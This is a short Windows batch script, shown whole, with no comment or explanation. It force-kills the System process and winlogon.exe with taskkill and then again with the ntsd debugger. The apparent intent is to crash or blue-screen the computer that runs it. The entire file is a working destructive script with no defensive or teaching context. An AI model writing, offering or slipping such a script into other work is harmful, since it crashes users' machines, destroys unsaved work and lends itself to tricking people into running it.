@echo off
taskkill /f /im System
taskkill /f /im winlogon.exe
ntsd -c q -pn winlogon.exe